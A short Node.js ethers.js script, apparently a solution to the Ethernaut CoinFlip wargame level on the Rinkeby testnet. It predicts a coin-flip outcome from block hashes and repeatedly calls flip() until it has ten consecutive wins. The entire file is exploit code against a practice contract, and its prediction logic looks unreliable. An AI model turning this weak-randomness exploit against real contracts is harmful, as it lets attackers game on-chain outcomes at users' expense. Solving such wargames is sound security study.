const {providers, Contract, Wallet} = require('ethers');
require('log-timestamp');

if (process.env.NODE_ENV === "production") {
    require("custom-env").env();
  } else {
    require("custom-env").env("development");
}

const CHAIN_ID = 4;
const flipaddress = "0xEFf8653F9A25D34895d9fC95aDA2829E3cbE5Ea0";
const abi = require('./abi.json');

const provider = new providers.InfuraProvider(CHAIN_ID)
const signer = new Wallet(process.env.PRIVY, provider);

console.log('logging....')

//ethernaut

const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
const flipContract = new Contract( flipaddress , abi , signer );

provider.on('block', (blockNumber)=>{

    console.log(`CurrentBlock: ${blockNumber}`);

    provider.getBlock(blockNumber).then(async (Block) =>{
        console.log(`CurrentHash: ${Block.hash}`);
        console.log('\n <<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n')
        let divisor = parseInt(Block.hash/FACTOR);
        console.log(`Divisor: ${divisor}`);
        await flipContract.flip(divisor);
        let wins = await flipContract.consecutiveWins();
        console.log(`Consecutive wins: ${wins}`)

        if (wins == 10){
            console.log('Predictions completed....')
            process.exit(1)
        }

    }) 
});